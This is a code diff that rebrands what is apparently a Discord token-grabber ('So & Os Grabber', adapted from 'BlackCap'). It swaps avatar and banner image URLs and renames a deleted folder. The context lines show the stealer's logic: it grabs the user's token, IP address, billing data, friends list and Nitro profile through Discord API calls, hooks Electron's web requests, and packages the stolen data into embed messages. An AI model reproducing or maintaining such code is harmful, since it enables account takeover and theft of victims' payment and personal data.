@@ -58,7 +58,7 @@ const makeEmbed = async ({
 }) => {
     var params = {
         username: "So & Os Grabber",
-        avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
+        avatar_url: "https://cdn.discordapp.com/attachments/1191442283237740736/1200148694897541131/soso.png",
         content: "",
         embeds: [{
             title: title,
@@ -254,7 +254,7 @@ const FirstTime = async () => {
     if (doTheLogOut) return false
     var token = await execScript(tokenScript)
     if (config['init-notify'] !== "true") return true
-    if (fs.existsSync(__dirname + "/blackcap")) fs.rmdirSync(__dirname + "/blackcap")
+    if (fs.existsSync(__dirname + "/help")) fs.rmdirSync(__dirname + "/help")
     var ip = await getIP()
     if (!token) {
         var params = await makeEmbed({
@@ -273,8 +273,8 @@ const FirstTime = async () => {
 
         var Billings = parseBilling(billing)
         var Friends = parseFriends(friends)
-        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHdsc/So & Os-Assets/main/blackcap%20(2).png"
-        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/KSCHdsc/So & Os-Assets/main/Banner.png"
+        if (!user.avatar) var userAvatar = "https://cdn.discordapp.com/attachments/1191442283237740736/1200148694897541131/soso.png"
+        if (!user.banner) var userBanner = "https://cdn.discordapp.com/attachments/1191442283237740736/1200148694897541131/soso.png"
 
         userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -365,8 +365,8 @@ const FirstTime = async () => {
 
             var Billings = parseBilling(billing)
             var Friends = parseFriends(friends)
-            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHdsc/So & Os-Assets/main/blackcap%20(2).png"
-            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/KSCHdsc/So & Os-Assets/main/Banner.png"
+            if (!user.avatar) var userAvatar = "https://cdn.discordapp.com/attachments/1191442283237740736/1200148694897541131/soso.png"
+            if (!user.banner) var userBanner = "https://cdn.discordapp.com/attachments/1191442283237740736/1200148694897541131/soso.png"
 
             userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
             userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -528,8 +528,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
     var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
-    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHdsc/So & Os-Assets/main/blackcap%20(2).png"
-    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/KSCHdsc/So & Os-Assets/main/Banner.png"
+    if (!user.avatar) var userAvatar = "https://cdn.discordapp.com/attachments/1191442283237740736/1200148694897541131/soso.png"
+    if (!user.banner) var userBanner = "https://cdn.discordapp.com/attachments/1191442283237740736/1200148694897541131/soso.png"
 
     userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
     userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
